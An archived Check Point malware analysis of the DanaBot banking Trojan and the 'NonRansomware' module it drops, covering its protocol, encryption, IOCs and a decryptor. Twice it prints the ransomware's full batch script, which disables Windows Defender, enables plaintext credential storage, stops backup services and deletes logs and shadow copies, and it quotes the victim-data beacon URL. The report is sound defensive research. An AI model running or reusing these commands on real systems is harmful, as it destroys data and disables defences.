{
    "id": "5fdd4505-2410-4a03-ba11-a339a0bb1c54",
    "created_at": "2023-01-12T15:09:02.014844Z",
    "updated_at": "2025-03-27T02:08:40.229511Z",
    "deleted_at": null,
    "sha1_hash": "44c20094569772554ba44efc659792684f3f2b6e",
    "title": "2019-06-20 - DanaBot Demands a Ransom Payment",
    "authors": "",
    "file_creation_date": "2022-05-28T02:27:07Z",
    "file_modification_date": "2022-05-28T02:27:07Z",
    "file_size": 668967,
    "plain_text": "# DanaBot Demands a Ransom Payment\n\n**research.checkpoint.com/danabot-demands-a-ransom-payment/**\n\nJune 20, 2019\nResearch by: Yaroslav Harakhavik and Aliaksandr Chailytko\n\n\nJune 20, 2019\n\n\n[It’s been over a year since DanaBot was first discovered, and its developers are still working to improve it and find new](https://www.proofpoint.com/us/threat-insight/post/danabot-new-banking-trojan-surfaces-down-under-0)\nopportunities to collaborate with other malware actors.\n\nCheck Point Research has been tracking DanaBot campaigns since August 2018 and recently discovered that some\nbots belonging to European campaigns had started dropping an executable file which turned out to be a ransomware\nwritten in Delphi.\n\n[DanaBot was already involved in sending spam and cooperating with GootKit in the past, as well as dropping Remcos](https://www.welivesecurity.com/2018/12/06/danabot-evolves-beyond-banking-trojan-new-spam/)\nRAT on infected machines. While DanaBot is still actively supported, its operators now add new plugins and\nconfiguration files and update various parts of the malware (including string encryption and file name generation\nalgorithms, and even the communication protocol).\n\nIn the following report, we will review the latest updates in DanaBot’s functionality, and take a deep dive into the inner[workings and encryption methods of this new ransomware.](https://www.checkpoint.com/cyber-hub/threat-prevention/what-is-ransomware/)\n\n**DanaBot Overview**\n\nDanaBot is a banking Trojan which is distributed using phishing emails. Links usually lead to either a JavaScript or\nPowerShell dropper.\n\n\n-----\n\nThe malware has the following capabilities:\n\nStealing browsers and FTP clients credentials\nCollecting crypto wallets credentials\nRunning a proxy on an infected machine\nPerforming Zeus-style web-injects\nTaking screenshots and recording video\nProviding a remote control via RDP or VNC\nRequesting updates via TOR\nBypassing UAC using a WUSA exploit\nRequesting updates from C&C server and execute commands\n\nAll DanaBot versions communicate with the C&C server via a custom TCP-based protocol over 443 port.\n\nSince its first appearance, DanaBot has spread throughout Europe, Australia, New Zealand, USA and Canada. Several\n[campaigns were discovered which target different countries. A campaign is defined by two hardcoded values:](https://www.netscout.com/blog/asert/danabots-travels-global-perspective)\n\nCampaign ID;\nCampaign salt – A number used for a packet validation by the C&C server\n\nCampaigns which are currently active are shown in Table 1.\n\n**Campaign ID** **Campaign Salt** **Countries**\n\n**2** 586856666 None\n\n**3** 897056567 Italy, Poland\n\n**4** 645456234 Australia\n\n**5** 423676934 Australia\n\n**6** 235791346 Australia\n\n**7** 765342789 Italy, Poland\n\n**8** 342768343 Canada, USA\n\n**9** 909445453 None\n\n**11** 445577321 Unknown\n\n**14** 653345567 Canada\n\n**15** 655222455 Poland, USA\n\n**17** 878777777 Unknown\n\n**18** 234456788 Unknown\n\n**19** 335347974 Unknown\n\n**20** 113334444 Unknown\n\n**24** 784356646 Unknown\n\n_Table 1 – Active DanaBot campaigns_\n\n**The Dropper**\n\nThe initial infection vector is usually an email with a document or a link which leads to a malicious dropper.\n\n\n-----\n\nOne of the latest cases is a new Australian campaign (ID 6) which was discovered by Check Point in April 2019.\nDanaBot was spread in its usual way – phishing emails with links to a file uploaded to Google Docs.\n\n**Fig 1: Phishing email examples**\n\nThe downloaded file turned out to be a VBS script which\nfunctions as a DanaBot dropper. The dropper unpacks\nthe DanaBot downloader DLL into the %TEMP%\ndirectory and registers it as a service.\n\n\n-----\n\n**Fig 2: DanaBot VBS dropper**\n\n**DanaBot Downloader**\n\nThe DanaBot downloader is represented by a 32- or 64-Bit DLL which starts by calling its f0 function. After the January\n2019 update, the downloader took on many of the main module’s roles: for example, it bypasses UAC and pretends to\nbe a Windows System Event Notification Service. It communicates with C&C servers, downloads DanaBot plugins and\nconfiguration files, updates itself, and executes the main module.\n\nIn January, the DanaBot downloader changed its communication protocol, obscuring it with the AES256 encryption.\n[The new protocol was described in detail by ESET. The initial communication between an infected machine and a C&C](https://www.welivesecurity.com/2019/02/07/danabot-updated-new-cc-communication)\nserver is shown in Figure 3.\n\nThe main points of the new protocol are:\n\n1. Both the bot and C&C server generate a new AES256 key (AesKey in Figure 1) for every packet they send.\n2. The bot sends an RSA public key (RsaSessionKey in Figure 1) to the C&C server which is used by the server to\n\nencrypt its generated AesKeys.\n3. The bot encrypts the generated AesKeys with a hardcoded public RSA key (HardcodedRsaKey in Figure 1). The\n\nprivate key is owned exclusively by the C&C server.\n\n\n-----\n\n**Fig 3: Encryption in Bot-to-C&C communication protocol**\n\nThe layout of TCP packets for the latest communication protocol is decribed in the Appendix A.\n\nThe DanaBot downloader can be detected by a public RSA key hardcoded into the DLL’s body. It’s usually XOR’ed\nwith a byte in the range [0x01; 0xFF].\n\n**Fig 4: The downloader’s hardcoded RSA public key**\n\nThe new campaign sample requests the following modules and configuration files:\n\nModules:\n**Main module**\n**Stealer plugin**\n**VNC plugin**\n**RDP plugin**\n\n\n-----\n\n**TOR plugin**\nConfiguration files:\n**BitVideo – Process list to record**\n**BitFiles – List of cryptocurrency files**\n**KeyProcess – Process list for keylogging**\n**PFilter – List of web-sites for sniffing**\n**Inject (or inject, inj, inj* or in*) – Web-inject configuration**\n**Redirect (redik*) – Configuration for redirection**\n\n**NonRansomware Distribution**\n\nAt the end of April, DanaBot C&C server 95.179[.]186[.]57 started including in the list of available modules a new\nmodule, D932613F6447F0C56744B1AD53230C62 for a European campaign with ID=7. The module, which was an\nexecutable file written in Delphi, was named “crypt.”\n\nThe new module turned to be a variant of the “NonRansomware” ransomware which enumerates files on local drives\nand encrypts all of them except the Windows directory. The encrypted files have a .non extension. A ransom message\nHowToBackFiles.txt is placed in each directory which contains encrypted files.\n\n[In the beginning of May, this ransomware was found in the Wild.](https://twitter.com/GrujaRS/status/1127880133631549441)\n\n**Fig 5: Ransom message**\n\nAfter its execution, the malware puts a batch file b.bat in %TEMP% and runs it. The batch script contains the following\ncontent:\n\n@echo off\n\nset “__COMPAT_LAYER=RunAsInvoker”\n\nreg add “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management” /v\nClearPageFileAtShutDown /t REG_DWORD /d 1 /f\n\nreg add “HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced” /v Hidden /t\nREG_DWORD /d 1 /f\n\nreg add “HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced” /v SuperHidden /t\nREG_DWORD /d 1 /f\n\n\n-----\n\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v\nShowSuperHidden /t REG_DWORD /d 1 /f\n\nreg add “HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender” /v DisableAntiSpyware /t\nREG_DWORD /d 1 /f\n\nreg add “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest” /v\nUseLogonCredential /t REG_DWORD /d 1 /f\n\nnet stop mssqlserver\n\nnet stop sqlwriter\n\nnet stop VeeamEndpointBackupSvc\n\nnet stop mssqlfdlauncher\n\nnet stop cpqvcagent\n\nnet stop TeamViewer\n\nnet stop klsbackup2013pro\n\nnet stop foxitreaderservice\n\nnet stop mysql\n\nnet stop mssqlserver\n\nnet stop mysql501\n\nnet stop veeamdeploysvc\n\nnet stop veeamtransportsvc\n\nnet stop wuauserv\n\nnet stop sysmgmthp\n\nnet stop sysdown\n\nnet stop adobearmservice\n\nnet stop themes\n\nnet stop sqlbrowser\n\nnet stop sql backupmaster\n\nnet stop sqlagent$sql2008exp\n\nnet stop sqltelemetry$sqlexpress\n\nnet stop mssql$sqlexpress\n\nnet stop mikroclientwservice\n\nnet stop reportserver\n\nnet stop sqlserveragent\n\nnet stop MSSQL$MIKRO\n\n\n-----\n\nnet stop msdtc\n\nnet stop sqltelemetryvv\n\ntaskkill /F /IM Veam.EndPoint.Tray.exe\n\ntaskkill /F /IM jusched.exe\n\ntaskkill /F /IM jucheck.exe\n\ntaskkill /F /IM IAStorDataMgrSvc.exe\n\ntaskkill /F /IM IAStorIcon.exe\n\ntaskkill /F /IM isa.exe\n\ntaskkill /F /IM armsvc.exe\n\ntaskkill /F /IM TeamViewer.exe\n\ntaskkill /F /IM TeamViewer_Service.exe\n\ntaskkill /F /IM tv_w32.exe\n\ntaskkill /F /IM tv_x64.exe\n\npowercfg.exe -h off\n\nRD /S /Q “C:\\Windows\\Temp\\”\n\nRD /S /Q “C:\\Windows\\Logs\\”\n\nRD /S /Q “C:\\Windows\\Installer\\”\n\npowershell.exe -ExecutionPolicy Bypass\n\nDisable-ComputerRestore “C:\\”\n\nDisable-ComputerRestore “D:\\”\n\nDisable-ComputerRestore “E:\\”\n\nDisable-ComputerRestore “F:\\”\n\nDisable-ComputerRestore “H:\\”\n\nClear-EventLog “Windows PowerShell”\n\nClear-RecycleBin -Confirm:$false\n\nvssadmin delete shadows /all\n\nThe scripts is responsible for:\n\nEnabling setting for showing hidden files\nDisabling Windows Defender\nEnabling ClearPageFileAtShutDown to purge the pagefile.sys\nStopping services\nStopping monitoring software (Veeam, TeamViewer, etc.)\nDisabling hibernation\nRemoving logs\n\n\n-----\n\nBypassing the PowerShell Execution Policy\nDisabling restoration for the following logical disks: C, D, E, F, H;\nClearing EventLog and Recycle Bin\nDeleting shadow copies for all volumes\n\nThen the malware schedules a task which will execute the malware every 14 minutes. The full command line for\nschtasks.exe is shown in Figure 6.\n\n**Fig 6: Ransomware task creation**\n\nThe obscured name of the task is just a damaged string “SysUtils.” The malware uses a simple algorithm and a\nhardcoded key “Hello World!” to decrypt the strings. The developers – deliberately or not – applied this algorithm to a\nplain string to create a task name.\n\nFig 7: Decrypting schtasks.exe parameters and damaging the task name by the same decryption algorithm\n\nThe string decryption algorithm is shown in Figure 8.\n\n**Fig 8: Decrypting strings that are used in the ransomware source code**\n\nThe ransomware enumerates logical drives, visits all the directories except Windows, and encrypts all the files using\nAES128. The password is a string representation of the system volume serial number. Every file is encrypted in a\nseparate thread.\n\nThe victim ID which is shown in the ransom message is generated from the password (i.e. C disk serial number)\naccording to the following algorithm:\n\n**Fig 9: Victim ID generation algorithm**\n\nBasically, this can be rewritten as the following equation:\n\n\n-----\n\nwhere – encryption key, – plain text, – cipher text and – text index.\n\nAs it is impossible to create an inverse function for this equation, it is likely that the malware operators have to\nbruteforce the password (p) on the basis of the known victim ID (c) and hardcoded key (k). The following code can be\nused to restore the password from the victim ID:\n\n**Fig 10: Restoring the password by the victim ID**\n\nThe encryption itself is not obvious unless… it was copy-pasted from the unit tests of the\n[DelphiEncryptionCompendium (DEC) library. The encryption function is a slightly modified DemoCipherFile procedure](https://github.com/decfpc/DelphiEncryptionCompendium/tree/master/DECTest)\nof the library’s test project. The main difference is using Panama hash instead of SHA1.\n\nA comparison of the disassembly code of the ransomware and the corresponding source code of DEC test project is\nshown in Figures 11-12.\n\n\n-----\n\nFig 11: Ransomware: Objects initialization\n\n**Fig 12: DEC: Objects initialization**\n\nThere is a very detailed description of the encryption process in the source code.\n\n\n-----\n\n**Fig 13: Comments for EncodeFile**\n\nSo the only thing that is needed to restore the encrypted files is to call the DecodeFile function for all the encrypted\nfiles with a password bruteforced using the known victim ID.\n\nA GUI tool for file decryption is attached at the end of this article.\n\nThe layout of an encrypted file and its structure are shown in Figure 14 and Table 2.\n\nFig 14: Encrypted file layout\n\n**Field** **Size**\n\n**Cipher Identity** 4 Bytes\n\n**CipherMode** 1 Byte\n\n**Hash Identity** 3 Bytes\n\n**Seed Size** 1 Byte\n\n**Seed** Seed Size\n\n**Cipher Text Size** 4 Bytes\n\n**Cipher Text** Cipher Text Size\n\n**Checksum Size** 4 Bytes\n\n**Checksum** Checksum Size\n\nTable 2: The structure of an encrypted file\n\n\n-----\n\nFinally, the malware checks a network connection and sends information about the infected PC to\nencrypter[.]webfoxsecurity[.]com. It first detects the version of Windows, generates a unique ID, retrieves the user\nname and builds the following string:\n\n{“#ersio.”:”1.4.3″, “win”:”<WINDOWS_VERSION>”, “hwid”:”<UNIQUE_ID>”, “UserName”:”User”, “Admin”:”0″}\n\nExample:\n\n{“#ersio.”:”1.4.3″, “win”:”Windows 7 Professional 32-bit”, “hwid”:”00029646″, “UserName”:”User”, “Admin”:”0″}\n\nUNIQUE_ID is generated based either on UUID (by using UuidCreateSequential) or on a volume serial number if\n_UuidCreateSequential failed._\n\nThe resulting string is encoded to Base64 and is sent to the previously mentioned address by using a GET request in\nthe following format:\n\nhttp:[/]/encrypter[.]webfoxsecurity[.]com/api/key?k=<BASE64>\n\n**Conclusion**\n\nFor almost a year, DanaBot has been extending its capabilities and evolving into a more sophisticated threat. We\nassume its operators will continue to add more improvements. Check Point provides a protection from these threats.\nWe’ll keep an eye on it and update you further.\n\nA lot of ransomware still remain a relatively stable source of income for cyber criminals. Therefore such simple “copypaste” encryptors as the one that was described here will continue to emerge constantly. Note – In general, we do not\nrecommend paying ransom to decrypt your files, and especially not in a case like this.\n\n**Appendix A. DanaBot Downloader’s payload packet layout**\n\nThe unencrypted packet layout and the meaning of its fields are shown in Figure 15 and Table 3.\n\nFig 15: Unencrypted initial payload packet layout\n\nTable 3: Packet layout\n\n**Offset** **Size** **Purpose**\n\n**0x00** 0x04 Packet header size (0xA7)\n\n**0x04** 0x08 Random number (rand_1)\n\n**0x0C** 0x08 Sum of header size and rand_1\n\n**0x14** 0x04 Campaign ID\n\n**0x18** 0x04 Message ID\n\n**0x1C** 0x04 Message parameter\n\n\n-----\n\n**0x20** 0x04 Random number (rand_2)\n\n**0x24** 0x04 Constant (0x00)\n\n**0x28** 0x04 Architecture (32, 64)\n\n**0x2C** 0x04 Windows version token\n\n**0x30** 0x04 0 or 0x03E9 (depends on Message ID)\n\n**0x34** 0x04 Constant (0x01)\n\n**0x38** 0x04 Admin status\n\n**0x3C** 0x08 Constant (0x01)\n\n**0x44** 0x01 Border\n\n**0x45** 0x20 Bot ID\n\n**0x65** 0x01 Border\n\n**0x66** 0x20 Module or Checksum #1 (depends on Message ID)\n\n**0x86** 0x01 Border\n\n**0x87** 0x20 Checksum #2\n\nChecksum #1 is required only in certain requests, such as an initial request when a bot communicates with the C&C\nserver to announce its presence. Checksum #2 is placed at the end of every payload that the bot sends to the C&C\nserver. Checksums are calculated by the following formulas:\n\nThe encrypted packet is preceded by a 24-byte header. The first 8 bytes contain the size of payload packet, the next 8\nbytes contain a random 2-byte number, and the last 8 bytes are equal to the sum of the payload size and the random\nnumber.\n\n**Fig 16: Example of a payload packet header**\n\n**Appendix B. DanaBot IOCs**\n\n**Alive C&C servers** **Status**\n\n**192.71.249.51** Alive\n\n**178.209.51.211** Alive\n\n**185.92.222.238** Down\n\n**89.144.25.104** Down\n\n**89.144.25.243** Alive\n\n**84.54.37.102** Down\n\n**149.28.180.182** Alive\n\n\n-----\n\n**95.179.186.57** Alive\n\n**Droppers location on GoogleCloud**\n\n**hxxps://docs.google[.]com/uc?id=1q4EYE4umvEFfdlL4_IshSQ4UqnhWAg9t**\n\n**hxxps://docs.google[.]com/uc?id=1gu8efqkSDDXZIDMX2cnFc73NyyuVYIF0**\n\n**WebInject & Redirect IP and domains**\n\n**194.76.225.28**\n\n**185.189.149.235**\n\n**demo.maintrump.org**\n\n**kaosutdoaaf.pw**\n\n**kaosutdoaaf6.pw**\n\n**kaosjdoaaf6.pw**\n\n**kadosjdoaaf6.pw**\n\n**kadosjdoaf6.pw**\n\n**kadosjdoafa.pw**\n\n**kadosjdoiafa.pw**\n\n**kdosjdoiafa.pw**\n\n**kduwouewpew.pw**\n\n**kdguwoewpew.pw**\n\n**sfjskdjfwoiewwegroup.tech**\n\n**brekwinarew.site**\n\n**jklfsdkfjhwefjosdf.top**\n\n**jklfsdkfjhwefjosdf.xyz**\n\n**goskilindad.site**\n\n**mon-sta.com**\n\n**lindakiski.top**\n\n**lidaskiheg.space**\n\n**lnet4-data.com**\n\n**net4-data.com**\n\n**lidaskiheg.site**\n\n**bruksialopws.icu**\n\n**brukaisloap.club**\n\n**braksiolsa.top**\n\n**brukiloapos.xyz**\n\n\n-----\n\n**oneuisopeweh.icu**\n\n**okjauwbueiws.xyz**\n\n**okjauwbueiws.top**\n\n**onueilsndsuywe.xyz**\n\n**gustemiaksa.icu**\n\n**thegiksjoute.online**\n\n**guksuoiew.top**\n\n**gustokiloe.xyz**\n\n**gousikolka.space**\n\n**thenautorern.tech**\n\n**nautorern.xyz**\n\n**kipokahynr.top**\n\n**kipokahynr.xyz**\n\n**muabolksae.club**\n\n**muoklaiow.xyz**\n\n**Examples of DanaBot modules**\n\n**Module** **MD5**\n\n**VBS Dropper** a1f119be2c55029f4d38f9356a1cc680\n\n**Downloader (x86)** b0c1bdc0b21aa99e2d777eef39c18a11\n\n**Downloader (x64)** 11e7e83043259310a5ae8689b4e34992\n\n**Main module (x86)** ca8c3113b9afa9d8bb8fe1f6653a9547\n\n**Main module (x64)** eacd1da520a33d842b09cef81606c745\n\n**Plugin** **MD5**\n\n**Stealer (x86)** ee89e89b0ee8f5b3241e69b4a6632b00\n\n**Stealer (x64)** 7efc6b42338b28470716c126a3c1cc46\n\n**VNC** d917226cba970dcf3f2b7c59cf212221\n\n**TOR** bcf4a4a96b6dacd026d507d0e49797C6\n\n**RDPWrap** 0f54d5a13821c0e31eb5730a4aba75f2\n\n**Appendix C. NonRansomware IOCs**\n\n**md5** **sha256**\n\n**a3629977d2c9f7eb30a13bdce14e3f45** 5dad162cbc990d3f45d2fe3b9d96ebd0c4af92997f621a207387201ed6b34893\n\n**e48067d2ad6adcbf2e4cf7e705d4bd82** 8a21e1224a8f1d7dd9d4e42c78c829fb82808631577477e8f699f15feb7c8988\n\n\n-----\n\n**Spawned processes**\n\nC:\\Users\\<USER_NAME> \\AppData\\Local\\Temp\\b.bat\n\nC:\\Windows\\System32\\schtasks.exe /c /Create /SC MINUTE /MO 14 /TN\n\\xc3\\xab\\xc3\\xb4\\xc3\\xa7\\xc3\\x89\\xc3\\xa5I\\xc3\\xb5\\xc3\\xa4 /TR “<FILE_PATH>” /F\n\n**Dropped Files**\n\nC:\\Windows\\System32\\cmd.exe /c %TEMP%\\b.bat\n\n<PATH_WITH_ENCRYPTED_FILES>\\HowToBackFiles.txt\n\n**Network**\n\nhttps://encrypter.webfoxsecurity.com/api/key?k=\n\n**Mutexes**\n\nRunningNow\n\n**Strings**\n\n[[email protected]](https://research.checkpoint.com/cdn-cgi/l/email-protection)\n\nHowToBackFiles.txt\n\n@echo off\n\nset “__COMPAT_LAYER=RunAsInvoker”\n\nreg add “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management” /v\nClearPageFileAtShutDown /t REG_DWORD /d 1 /f\n\nreg add “HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced” /v Hidden /t\nREG_DWORD /d 1 /f\n\nreg add “HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced” /v SuperHidden\n/t REG_DWORD /d 1 /f\n\nreg add “HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced” /v\nShowSuperHidden /t REG_DWORD /d 1 /f\n\nreg add “HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender” /v DisableAntiSpyware /t\nREG_DWORD /d 1 /f\n\nreg add “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest” /v\nUseLogonCredential /t REG_DWORD /d 1 /f\n\nnet stop mssqlserver\n\nnet stop sqlwriter\n\nnet stop VeeamEndpointBackupSvc\n\nnet stop mssqlfdlauncher\n\nnet stop cpqvcagent\n\nnet stop TeamViewer\n\nnet stop klsbackup2013pro\n\n\n-----\n\nnet stop foxitreaderservice\n\nnet stop mysql\n\nnet stop mssqlserver\n\nnet stop mysql501\n\nnet stop veeamdeploysvc\n\nnet stop veeamtransportsvc\n\nnet stop wuauserv\n\nnet stop sysmgmthp\n\nnet stop sysdown\n\nnet stop adobearmservice\n\nnet stop themes\n\nnet stop sqlbrowser\n\nnet stop sql backupmaster\n\nnet stop sqlagent$sql2008exp\n\nnet stop sqltelemetry$sqlexpress\n\nnet stop mssql$sqlexpress\n\nnet stop mikroclientwservice\n\nnet stop reportserver\n\nnet stop sqlserveragent\n\nnet stop MSSQL$MIKRO\n\nnet stop msdtc\n\nnet stop sqltelemetryvv\n\ntaskkill /F /IM Veam.EndPoint.Tray.exe\n\ntaskkill /F /IM jusched.exe\n\ntaskkill /F /IM jucheck.exe\n\ntaskkill /F /IM IAStorDataMgrSvc.exe\n\ntaskkill /F /IM IAStorIcon.exe\n\ntaskkill /F /IM isa.exe\n\ntaskkill /F /IM armsvc.exe\n\ntaskkill /F /IM TeamViewer.exe\n\ntaskkill /F /IM TeamViewer_Service.exe\n\ntaskkill /F /IM tv_w32.exe\n\ntaskkill /F /IM tv_x64.exe\n\npowercfg.exe -h off\n\n\n-----\n\nRD /S /Q “C:\\Windows\\Temp\\”\n\nRD /S /Q “C:\\Windows\\Logs\\”\n\nRD /S /Q “C:\\Windows\\Installer\\”\n\npowershell.exe -ExecutionPolicy Bypass\n\nDisable-ComputerRestore “C:\\”\n\nDisable-ComputerRestore “D:\\”\n\nDisable-ComputerRestore “E:\\”\n\nDisable-ComputerRestore “F:\\”\n\nDisable-ComputerRestore “H:\\”\n\nClear-EventLog “Windows PowerShell”\n\nClear-RecycleBin -Confirm:$false\n\nvssadmin delete shadows /all\n\n**Appendix D. Check Point Signatures**\n\n**Malware** **CP Product** **Detect Name**\n\n**DanaBot** Anti-Bot Trojan.Win32.DanaBot.*\n\nThread Emulation Trojan.Win.DanaBot.A\n\nSand Blast Agent Trojan.Win.DanaBot.B\n\n**NonRansomware** Anti-Ransomware Ransomware.Win.TouchTrapFiles.A\n\nSand Blast Agent Gen.Win.DisWinDef.A\n\n**Decryption tool**\n\n[Click here to download the NonDecryptor tool.](https://research.checkpoint.com/wp-content/uploads/2019/06/NonDecryptor.zip)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-06-20 - DanaBot Demands a Ransom Payment.pdf"
    ],
    "report_names": [
        "2019-06-20 - DanaBot Demands a Ransom Payment.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536142,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1653704827,
    "ts_modification_date": 1653704827,
    "files": {
        "pdf": "https://archive.orkl.eu/44c20094569772554ba44efc659792684f3f2b6e.pdf",
        "text": "https://archive.orkl.eu/44c20094569772554ba44efc659792684f3f2b6e.txt",
        "img": "https://archive.orkl.eu/44c20094569772554ba44efc659792684f3f2b6e.jpg"
    }
}